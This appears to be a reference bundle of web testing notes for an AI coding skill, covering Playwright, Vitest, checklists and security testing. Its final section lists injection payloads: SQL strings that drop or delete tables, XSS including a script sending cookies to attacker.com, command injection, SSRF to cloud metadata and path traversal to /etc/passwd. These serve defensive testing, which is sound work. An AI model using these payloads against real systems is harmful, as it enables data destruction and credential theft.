# Playwright Component Testing

## Status

**Production-ready** as of 2024. No longer experimental.

## Setup

```bash
npm init playwright@latest -- --ct
```

## Configuration

```typescript
// playwright-ct.config.ts
import { defineConfig, devices } from '@playwright/experimental-ct-react';

export default defineConfig({
  testDir: './src',
  use: {
    ctPort: 3100,
  },
  projects: [
    { name: 'chromium', use: { ...devices['Desktop Chrome'] } },
    { name: 'firefox', use: { ...devices['Desktop Firefox'] } },
    { name: 'webkit', use: { ...devices['Desktop Safari'] } },
  ],
});
```

## Basic Test

```typescript
import { test, expect } from '@playwright/experimental-ct-react';
import { Button } from './Button';

test('renders button with text', async ({ mount }) => {
  const component = await mount(<Button>Click me</Button>);
  await expect(component).toContainText('Click me');
});

test('handles click event', async ({ mount }) => {
  let clicked = false;
  const component = await mount(
    <Button onClick={() => clicked = true}>Click</Button>
  );
  await component.click();
  expect(clicked).toBe(true);
});
```

## With Props and State

```typescript
test('counter increments', async ({ mount }) => {
  const component = await mount(<Counter initial={0} />);
  await expect(component.getByTestId('count')).toHaveText('0');
  await component.getByRole('button', { name: 'Increment' }).click();
  await expect(component.getByTestId('count')).toHaveText('1');
});
```

## Visual Regression

```typescript
test('button styles', async ({ mount }) => {
  const component = await mount(<Button variant="primary">Submit</Button>);
  await expect(component).toHaveScreenshot('button-primary.png');
});
```

## Mocking

```typescript
test('with mocked data', async ({ mount }) => {
  const component = await mount(
    <UserContext.Provider value={{ user: { name: 'Test' } }}>
      <Profile />
    </UserContext.Provider>
  );
  await expect(component).toContainText('Test');
});
```

## When to Use CT vs E2E

| Use CT When | Use E2E When |
|-------------|--------------|
| Testing isolated components | Testing user flows |
| Visual regression on components | Navigation, routing |
| Component interactions | Full page behavior |
| Fast feedback during dev | Integration with backend |

## When to Use CT vs Vitest

| Use CT When | Use Vitest When |
|-------------|-----------------|
| Real browser needed | Speed is priority |
| Cross-browser testing | Unit testing logic |
| CSS/layout verification | Mocking is simpler |
| Complex DOM interactions | jsdom is sufficient |

## Limitations

- Complex object passing requires serialization
- Slower than jsdom-based tests
- Watch mode less efficient than Vitest

## Commands

```bash
npx playwright test -c playwright-ct.config.ts
npx playwright test -c playwright-ct.config.ts --ui
```


### pre release checklist

# Pre-Release Testing Checklist

## Cross-Browser & Responsive

- [ ] Chrome, Firefox, Safari, Edge latest
- [ ] Mobile: iPhone real device (Safari iOS)
- [ ] Mobile: Android real device (Chrome)
- [ ] Breakpoints: 375px, 768px, 1024px, 1920px
- [ ] Portrait & landscape orientations

## Functional Testing

- [ ] Primary user journeys complete
- [ ] CRUD operations work
- [ ] Login/logout/password reset
- [ ] Form validation enforced
- [ ] Search/filter/sort/pagination

## Interactive Elements

- [ ] Buttons, links respond correctly
- [ ] Modals open/close properly
- [ ] Dropdowns, tooltips work
- [ ] Touch gestures work on mobile
- [ ] Drag & drop (if applicable)

## Keyboard & Accessibility

- [ ] Tab navigation through all elements
- [ ] Enter/Space activates buttons
- [ ] Escape closes modals
- [ ] Visible focus indicators
- [ ] Screen reader announces content

## Performance (Core Web Vitals)

- [ ] LCP < 2.5 seconds
- [ ] CLS < 0.1
- [ ] INP < 200ms
- [ ] Images optimized & lazy loaded

## Visual & Layout

- [ ] No horizontal scroll on mobile
- [ ] Content reflows at breakpoints
- [ ] Sufficient color contrast
- [ ] Animations smooth

## Error Handling

- [ ] Network errors show retry option
- [ ] 401/403/404/500 handled properly
- [ ] Form errors highlight fields

## Security

- [ ] HTTPS enforced
- [ ] Security headers present
- [ ] CSRF tokens in forms

## Test Quality

- [ ] All tests pass (no flaky tests)
- [ ] Coverage: Unit 70%, Integration 20%, E2E 10%
- [ ] Accessibility audit passed

## Quick Commands

```bash
npm run test                                    # All tests
npx playwright test --project=chromium,firefox  # Cross-browser
npx @axe-core/cli https://staging.example.com   # Accessibility
npx lighthouse https://staging.example.com       # Performance
curl -I https://staging.example.com | grep -i security  # Headers
```


### security checklists

# Security Checklists

## Authentication Security

- [ ] Strong auth mechanism (OAuth 2.0, JWT, OIDC)
- [ ] No basic auth or custom schemes
- [ ] Password policy enforced (12+ chars, complexity)
- [ ] MFA/2FA for sensitive operations
- [ ] Account lockout after failed attempts (5-10)
- [ ] Secure password reset (token expiration)
- [ ] Default credentials removed/disabled
- [ ] API keys not in code/version control
- [ ] Session tokens cryptographically generated
- [ ] Logout invalidates session/token

## API Security

- [ ] HTTPS/TLS enforced for all endpoints
- [ ] API versioning strategy in place
- [ ] Rate limiting implemented
- [ ] Auth required (API key or OAuth token)
- [ ] Input validation on all parameters
- [ ] Output encoding/sanitization
- [ ] CORS headers properly configured
- [ ] Pagination limits prevent enumeration
- [ ] Proper HTTP status codes (401 vs 403)
- [ ] Error messages don't expose internals

## Session Management

- [ ] Session IDs cryptographically random
- [ ] Cookies: HttpOnly, Secure, SameSite flags
- [ ] Session timeout (idle + absolute)
- [ ] Session invalidation on logout
- [ ] Session fixation protection (regenerate on login)
- [ ] CSRF tokens for state-changing ops
- [ ] Session data server-side (not in cookies)

## Input Validation

- [ ] Whitelist validation (allow only expected)
- [ ] Type validation (string, number, date)
- [ ] Length validation (min/max)
- [ ] Format validation (regex for email, URL)
- [ ] SQL parameters use prepared statements
- [ ] NoSQL queries use safe APIs
- [ ] Command execution avoided/validated
- [ ] XML external entities disabled (XXE)
- [ ] JSON parsing safe (no eval)
- [ ] ReDoS-safe regex patterns

## Security Headers

```
Content-Security-Policy: default-src 'self'; script-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

- [ ] CSP configured (restrict resource loading)
- [ ] X-Content-Type-Options: nosniff
- [ ] X-Frame-Options (DENY or SAMEORIGIN)
- [ ] HSTS enabled with appropriate max-age
- [ ] Referrer-Policy configured
- [ ] Permissions-Policy set
- [ ] Server/X-Powered-By headers removed
- [ ] CORS: No wildcard on credentialed endpoints

## Verify Headers

```bash
# Check security headers
curl -I https://example.com

# Use securityheaders.com
# Use observatory.mozilla.org
```


### security testing overview

# Security Testing Overview

## OWASP Top 10 (2024)

| Rank | Vulnerability | Testing Method |
|------|--------------|----------------|
| A01 | Broken Access Control | Test unauthorized actions across roles |
| A02 | Cryptographic Failures | Check HTTPS, encryption algorithms |
| A03 | Injection (SQL/NoSQL/Cmd) | Test with payloads (see vulnerability-payloads.md) |
| A04 | Insecure Design | Threat modeling, abuse case testing |
| A05 | Security Misconfiguration | Default creds, open ports, headers |
| A06 | Vulnerable Components | npm audit, Snyk scanning |
| A07 | Auth Failures | Brute force, session hijacking |
| A08 | Integrity Failures | Deserialization, CI/CD security |
| A09 | Logging Failures | Verify security event logging |
| A10 | SSRF | Test internal URL access |

## Security Testing Types

### SAST (Static Analysis)
- **When**: Early development, pre-commit
- **Tools**: SonarQube, CodeQL, Semgrep
- **Focus**: Code flaws without execution
- **Limitation**: High false positives

### DAST (Dynamic Analysis)
- **When**: QA/staging, running application
- **Tools**: OWASP ZAP, Burp Suite, Nuclei
- **Focus**: Runtime vulnerabilities
- **Limitation**: Requires running app

### SCA (Dependency Scanning)
- **Tools**: npm audit, Snyk, Dependabot
- **Focus**: Known CVEs in dependencies
- **Automation**: CI/CD integration

### Secret Detection
- **Tools**: detect-secrets, GitGuardian
- **Focus**: API keys, passwords in code
- **Implementation**: Pre-commit hooks

## Quick Security Scan

```bash
# Dependency vulnerabilities
npm audit
npx snyk test

# OWASP ZAP baseline scan
docker run -t ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t https://example.com

# Nuclei template scan
nuclei -u https://example.com -t cves/

# Check security headers
curl -I https://example.com | grep -i "security\|content-security\|x-"
```

## Penetration Testing Phases

1. **Reconnaissance**: DNS, WHOIS, tech fingerprinting
2. **Scanning**: Port scan, service enumeration
3. **Vulnerability Assessment**: Automated + manual testing
4. **Exploitation**: Verify findings, demonstrate impact
5. **Reporting**: CVSS scores, remediation guidance

## Tools Comparison

| Tool | Type | Cost | Best For |
|------|------|------|----------|
| OWASP ZAP | DAST | Free | CI/CD, learning |
| Burp Suite | DAST | Paid | Enterprise, detailed |
| Nuclei | DAST | Free | Custom checks |
| npm audit | SCA | Free | Node.js deps |
| Snyk | SCA | Free/Paid | Multi-language |

## CI/CD Integration

```yaml
# Security scanning in pipeline
- name: Dependency Scan
  run: npm audit --audit-level=high

- name: SAST Scan
  uses: github/codeql-action/analyze@v3

- name: DAST Scan
  run: |
    docker run -v $(pwd):/zap/wrk:rw ghcr.io/zaproxy/zaproxy:stable \
      zap-api-scan.py -t http://localhost:3000/openapi.json -f openapi
```


### shadow dom testing

# Shadow DOM & Web Components Testing

## Challenges

- CSS encapsulation breaks selectors
- Elements hidden from DOM queries
- XPath doesn't penetrate shadow boundaries

## Tool Support

| Tool | Support | Method |
|------|---------|--------|
| Playwright | Native | `>>` piercing selector |
| Cypress | Good | `.shadow()` command |
| Selenium | Limited | JS execution |
| Axe | v5.7+ | API support |

## Playwright Shadow Piercing

```javascript
const input = page.locator('my-component >> .internal-input');
const button = page.locator('comp-a >> comp-b >> button');
const el = page.locator('custom-element >> button:has-text("Click me")');
```

## Cypress Shadow DOM

```javascript
cy.get('my-component').shadow().find('.internal-button').click();

// Enable globally: { includeShadowDom: true }
```

## Selenium Workaround

```javascript
const shadowHost = driver.findElement(By.css('my-component'));
const shadowRoot = driver.executeScript('return arguments[0].shadowRoot', shadowHost);
const button = shadowRoot.findElement(By.css('button'));
```

## Page Object Pattern

```typescript
export class MyComponentPO {
  constructor(private page: Page) {}

  async fillEmail(email: string) {
    await this.page.locator('my-form >> input[type="email"]').fill(email);
  }

  async submit() {
    await this.page.locator('my-form >> button[type="submit"]').click();
  }
}
```

## Best Practices

1. Request `open` shadow roots when possible
2. Encapsulate shadow traversal in page objects
3. Avoid deep nesting (increases complexity)

## Debugging

```javascript
const contents = await page.evaluate(() => {
  return document.querySelector('my-component').shadowRoot.innerHTML;
});
```


### test data management

# Test Data Management

## Faker.js (Dynamic Data Generation)

```typescript
import { faker } from '@faker-js/faker';

// Reproducible data (seeding)
faker.seed(123);

const user = {
  id: faker.string.uuid(),
  name: faker.person.fullName(),
  email: faker.internet.email(),
  avatar: faker.image.avatar(),
  createdAt: faker.date.past(),
};
```

## Factory Pattern (Fishery)

```typescript
import { Factory } from 'fishery';
import { faker } from '@faker-js/faker';

// Define factory
const userFactory = Factory.define<User>(() => ({
  id: faker.string.uuid(),
  name: faker.person.fullName(),
  email: faker.internet.email(),
  role: 'user',
}));

// Usage
const user = userFactory.build();
const admin = userFactory.build({ role: 'admin' });
const users = userFactory.buildList(5);
```

## Factory with Associations

```typescript
const postFactory = Factory.define<Post>(({ associations }) => ({
  id: faker.string.uuid(),
  title: faker.lorem.sentence(),
  author: associations.author || userFactory.build(),
}));

const post = postFactory.build({
  author: userFactory.build({ role: 'admin' }),
});
```

## Fixtures (Static Baseline Data)

```typescript
// fixtures/users.ts
export const testUsers = {
  admin: {
    id: 'admin-001',
    email: 'admin@test.com',
    role: 'admin',
  },
  member: {
    id: 'member-001',
    email: 'member@test.com',
    role: 'member',
  },
};

// In tests
import { testUsers } from './fixtures/users';
```

## Combined Pattern (Fixtures + Factories)

```typescript
// Baseline fixtures for known states
const baseUser = testUsers.admin;

// Factory for dynamic variations
const dynamicUser = userFactory.build({
  ...baseUser,
  email: faker.internet.email(), // Override specific fields
});
```

## Database Seeding

```typescript
// seed.ts
async function seedTestData(db: Database, workerIndex: number) {
  // Worker-isolated data
  const prefix = `w${workerIndex}`;

  await db.users.insertMany([
    { id: `${prefix}-user-1`, email: `user1-${prefix}@test.com` },
    { id: `${prefix}-user-2`, email: `user2-${prefix}@test.com` },
  ]);
}

async function clearTestData(db: Database, workerIndex: number) {
  const prefix = `w${workerIndex}`;
  await db.users.deleteMany({ id: { $regex: `^${prefix}` } });
}
```

## Best Practices

- **Reproducibility:** Seed Faker for consistent test data
- **Isolation:** Prefix data with worker index for parallelism
- **Cleanup:** Always clean up in afterEach/afterAll
- **Minimal data:** Only create what's needed for test
- **Type safety:** Type your factories

## Anti-Patterns

```typescript
// BAD: Hardcoded values
const user = { email: 'test@test.com' }; // Collisions!

// GOOD: Dynamic generation
const user = { email: faker.internet.email() };

// BAD: Shared mutable state
let globalUser;
beforeAll(() => { globalUser = createUser(); });

// GOOD: Fresh data per test
beforeEach(() => { user = userFactory.build(); });
```


### test flakiness mitigation

# Test Flakiness Mitigation

## Root Causes

- Timing mismatches (hard waits)
- Non-isolated tests (shared state)
- Network instability
- Animation timing

## Explicit Waits (Not Hard Waits)

```javascript
// BAD: Hard wait
await new Promise(r => setTimeout(r, 500));

// GOOD: Wait for condition
await page.waitForSelector('.success', { timeout: 10000 });
await expect(page.locator('.count')).toContainText('5');

// BEST: Playwright auto-wait
await page.getByRole('button', { name: /submit/i }).click();
```

## Wait Timeout Guidelines

| Scenario | Timeout |
|----------|---------|
| Page load | 10-15s |
| Element visibility | 5-10s |
| API responses | 30-60s |

## Retry Strategies

```javascript
// Playwright built-in
test.describe.configure({ retries: 3 });

// Per-test
test('flaky test', async ({ page }) => { /* */ }, { retries: 3 });

// Exponential backoff
async function retryWithBackoff(fn, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try { return await fn(); }
    catch (e) {
      if (i === maxRetries - 1) throw e;
      await new Promise(r => setTimeout(r, Math.pow(2, i) * 1000));
    }
  }
}
```

## Test Isolation

```javascript
// BAD: Dependent tests
let userId;
test('create', async () => { userId = await createUser(); });
test('load', async () => { await loadUser(userId); }); // Depends on previous!

// GOOD: Independent
test('create and load', async ({ page }) => {
  const userId = await createUser(page);
  await loadUser(page, userId);
});
```

## Disable Animations

```css
* { animation-duration: 0s !important; transition-duration: 0s !important; }
```

## Network Stability

```javascript
await page.route('**/external-api/**', route =>
  route.fulfill({ status: 200, body: '{}' })
);
```

## Flakiness Detection

```bash
npx playwright test --repeat-each=5
```


### testing pyramid strategy

# Testing Strategy Models

## Model Comparison

| Model | Structure | Best For |
|-------|-----------|----------|
| Pyramid | Unit 70% > Integration 20% > E2E 10% | Monoliths, logic-heavy |
| Trophy (Dodds) | Static > Integration (largest) > Unit > E2E | Modern SPAs |
| Honeycomb (Spotify) | Contract-centric cells | Microservices |
| Diamond | Balanced unit/integration | Domain services |

## Testing Trophy (Recommended for SPAs)

```
         E2E (minimal)
        /------------\
       / Integration  \   <-- Largest portion
      /----------------\
     /   Unit Tests     \
    /--------------------\
   /   Static Analysis    \  <-- Foundation
  /________________________\
```

**Philosophy:** "The more your tests resemble how software is used, the more confidence they give you." - Kent C. Dodds

**Key Principles:**
- Test behavior, not implementation
- Minimize mocking
- Prioritize integration tests
- Use accessible queries (getByRole first)

## Testing Honeycomb (Microservices)

Contract testing at center, interconnected cells for:
- Unit tests (implementation details)
- Integration tests (service boundaries)
- Contract tests (API agreements)
- E2E tests (critical paths only)

## Ratios by Context

| Context | Unit | Integration | E2E |
|---------|------|-------------|-----|
| Classic Pyramid | 70% | 20% | 10% |
| Testing Trophy | 30% | 50% | 10% |
| API-heavy | 75% | 15% | 10% |
| Microservices | 40% | 40% | 20% |

## Priority Matrix

| Priority | Category | Examples |
|----------|----------|----------|
| P0 | Core flows | Signup, login, checkout, payment |
| P1 | Major features | Search, CRUD, navigation |
| P2 | Secondary | Filters, sorting, pagination |
| P3 | Edge cases | Empty states, max limits |

## Coverage Targets

| Area | Target |
|------|--------|
| Critical paths | 100% |
| Core features | 80-90% |
| Overall | 75-85% |

**Note:** Coverage as diagnostic, not target. Focus on what's uncovered.

## CI/CD Order

```yaml
- run: npm run lint          # Gate 0: Static analysis
- run: npm run test:unit     # Gate 1: Fast fail
- run: npm run test:integration # Gate 2
- run: npm run test:e2e      # Gate 3: Pre-merge
```


### unit integration testing

# Unit & Integration Testing

## Framework Comparison

| Framework | Speed | Best For |
|-----------|-------|----------|
| Vitest | Fastest | Modern projects, Vite |
| Jest | Fast | React/CRA legacy |
| Bun test | Ultra-fast | Bun projects |

## Vitest Setup

```typescript
// vitest.config.ts
export default defineConfig({
  test: {
    environment: 'jsdom', // or 'happy-dom'
    globals: true,
    coverage: { reporter: ['text', 'json', 'html'] },
  },
});
```

## Vitest Browser Mode (Real Browser)

```typescript
// vitest.config.ts - higher fidelity than jsdom
export default defineConfig({
  test: {
    browser: {
      enabled: true,
      name: 'chromium',
      provider: 'playwright',
    },
  },
});
```

**When to use:** Complex DOM interactions, CSS testing, browser APIs

## Test Structure (AAA)

```typescript
import { describe, it, expect, beforeEach } from 'vitest';

describe('UserService', () => {
  let service: UserService;

  beforeEach(() => {
    service = new UserService();
  });

  it('creates user with valid data', () => {
    // Arrange
    const userData = { email: 'test@example.com' };

    // Act
    const user = service.create(userData);

    // Assert
    expect(user.id).toBeDefined();
    expect(user.email).toBe('test@example.com');
  });

  it('throws on invalid email', () => {
    expect(() => service.create({ email: 'invalid' }))
      .toThrow('Invalid email');
  });
});
```

## Integration Test

```typescript
describe('User API', () => {
  let db: Database;

  beforeAll(async () => {
    db = new Database(':memory:');
    await db.migrate();
  });

  afterEach(async () => {
    await db.clearAllTables();
  });

  it('persists and retrieves user', async () => {
    await db.users.insert({ email: 'test@example.com' });
    const user = await db.users.findOne({ email: 'test@example.com' });
    expect(user).toBeDefined();
  });
});
```

## Test Naming

```typescript
// Good - describes behavior
it('should return 200 when valid token provided');
it('should throw ValidationError when email invalid');

// Bad - vague
it('test1');
it('works');
```

## Mocking

```typescript
import { vi } from 'vitest';

// Mock module
vi.mock('./api', () => ({
  fetchUser: vi.fn().mockResolvedValue({ name: 'John' })
}));

// Spy
const spy = vi.spyOn(console, 'log');
expect(spy).toHaveBeenCalledWith('message');
```

## Coverage Targets

| Area | Target |
|------|--------|
| Critical paths | 100% |
| Core features | 80-90% |
| Overall | 75-85% |

## Commands

```bash
npx vitest run              # Run all
npx vitest                  # Watch mode
npx vitest run --coverage   # Coverage
npx vitest run -u           # Update snapshots
npx vitest --browser        # Browser mode
```


### visual regression

# Visual Regression Testing

## Playwright Screenshot Comparison

```typescript
import { test, expect } from '@playwright/test';

test('homepage visual', async ({ page }) => {
  await page.goto('http://localhost:3000');
  await expect(page).toHaveScreenshot('homepage.png');
});

test('component visual', async ({ page }) => {
  await page.goto('http://localhost:3000');
  const header = page.locator('header');
  await expect(header).toHaveScreenshot('header.png');
});

test('with threshold', async ({ page }) => {
  await page.goto('http://localhost:3000');
  await expect(page).toHaveScreenshot('page.png', {
    maxDiffPixels: 100,
    maxDiffPixelRatio: 0.01,
  });
});
```

## Configuration

```typescript
// playwright.config.ts
export default defineConfig({
  expect: {
    toHaveScreenshot: { maxDiffPixels: 50, threshold: 0.2 },
  },
  projects: [
    { name: 'chromium', use: { ...devices['Desktop Chrome'] } },
    { name: 'mobile', use: { ...devices['iPhone 12'] } },
  ],
});
```

## Commands

```bash
npx playwright test --update-snapshots        # Update all
npx playwright test visual.spec.ts -u         # Update specific
```

## Workflow

1. **Baseline**: First run creates reference screenshots
2. **Compare**: Subsequent runs compare against baseline
3. **Review**: Check diff images on failure
4. **Approve**: Update snapshots if change is intentional

## Best Practices

- Test critical UI components individually
- Use consistent viewport sizes
- Disable animations: `animation-duration: 0s !important`
- Mock dynamic content (dates, random data)
- Run on CI with consistent environment

## Third-Party Tools

| Tool | Use Case |
|------|----------|
| Percy | Cloud-based, BrowserStack integration |
| Chromatic | Storybook visual testing |
| Playwright | Built-in, no vendor lock-in |

## CI Integration

```yaml
- name: Visual Tests
  run: npx playwright test --grep @visual
- uses: actions/upload-artifact@v4
  if: failure()
  with:
    name: visual-diffs
    path: test-results/
```

## Visual vs Accessibility

| Aspect | Visual | Accessibility |
|--------|--------|---------------|
| Catches | Layout, colors | Semantic, ARIA |
| Method | Pixel diff | DOM analysis |

**Use both**: Visual misses semantic issues, a11y misses layout bugs.


### vulnerability payloads

# Vulnerability Test Payloads

## SQL Injection

### Text Input
```
' OR '1'='1
' OR 1=1 --
'; DROP TABLE users; --
' UNION SELECT NULL, NULL --
```

### Numeric Input
```
1 OR 1=1
1; DELETE FROM users; --
```

### Blind (Time-based)
```
' OR SLEEP(5) --
' AND (SELECT(SLEEP(5)))a --
```

## XSS (Cross-Site Scripting)

### Reflected
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
"><script>alert('XSS')</script>
```

### DOM-based
```
javascript:alert('XSS')
<iframe src="javascript:alert('XSS')"></iframe>
```

### Cookie Theft
```html
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
```

## NoSQL Injection (MongoDB)

```json
{"$ne": null}
{"$gt": ""}
{"$regex": ".*"}
{"$where": "1==1"}
```

## Command Injection

```
; ls -la
| whoami
`whoami`
$(whoami)
```

## SSRF

```
http://localhost/admin
http://127.0.0.1/admin
http://169.254.169.254/  # AWS metadata
```

## Path Traversal

```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
```

## CSRF Testing

1. Submit form without CSRF token
2. Reuse captured token multiple times
3. Modify/remove token parameter

## Testing Tools

```bash
# SQLMap
sqlmap -u "http://example.com/page?id=1" --dbs

# OWASP ZAP active scan
zap-cli active-scan http://example.com
```




> **Note (Cursor):** Script execution sections in this skill are Claude Code only. Cursor uses the instructions above. Run `.claude/skills/install.sh` in Claude Code to enable full capabilities.
